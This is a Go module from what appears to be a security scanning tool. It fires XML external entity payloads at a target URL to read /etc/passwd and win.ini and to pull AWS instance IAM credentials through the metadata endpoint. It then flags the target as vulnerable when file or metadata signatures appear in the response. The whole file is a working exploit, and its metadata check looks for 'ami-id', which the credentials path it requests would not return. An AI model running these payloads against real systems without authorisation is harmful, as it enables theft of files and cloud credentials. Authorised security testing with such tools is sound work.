package modules

import (
	"bytes"
	"context"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

// XMLExternalEntityInjectionXxeResult holds the result of the XMLExternalEntityInjectionXxe module execution.
type XMLExternalEntityInjectionXxeResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// XMLExternalEntityInjectionXxe executes the xml_external_entity_injection_xxe security technique.
type XMLExternalEntityInjectionXxe struct {
	Target     string
	maxThreads int
	mu         sync.Mutex
	results    []XMLExternalEntityInjectionXxeResult
	client     *http.Client
}

// NewXMLExternalEntityInjectionXxe creates a new instance.
func NewXMLExternalEntityInjectionXxe(target string) *XMLExternalEntityInjectionXxe {
	return &XMLExternalEntityInjectionXxe{
		Target:     EnsureHTTPPrefix(target),
		maxThreads: 5,
		client:     NewHTTPClient(10 * time.Second),
	}
}

func (m *XMLExternalEntityInjectionXxe) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.maxThreads = count
}

var xxePayloads = []string{
	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`,
	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><root>&test;</root>`,
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>`,
}

func (m *XMLExternalEntityInjectionXxe) Execute(ctx context.Context) ([]XMLExternalEntityInjectionXxeResult, error) {
	m.results = make([]XMLExternalEntityInjectionXxeResult, 0)
	
	jobs := make(chan string, len(xxePayloads))
	for _, p := range xxePayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.maxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *XMLExternalEntityInjectionXxe) testPayload(ctx context.Context, payload string) {
	req, err := http.NewRequestWithContext(ctx, "POST", m.Target, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/xml")

	resp, err := m.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyStr := string(bodyBytes)

	// Signatures for successful LFI or SSRF via XXE
	if strings.Contains(bodyStr, "root:x:0:0:") || 
	   strings.Contains(strings.ToLower(bodyStr), "[extensions]") ||
	   strings.Contains(bodyStr, "ami-id") { // AWS metadata indicator
		m.mu.Lock()
		m.results = append(m.results, XMLExternalEntityInjectionXxeResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: "XXE vulnerability detected. Sensitive data retrieved.",
		})
		m.mu.Unlock()
	}
}
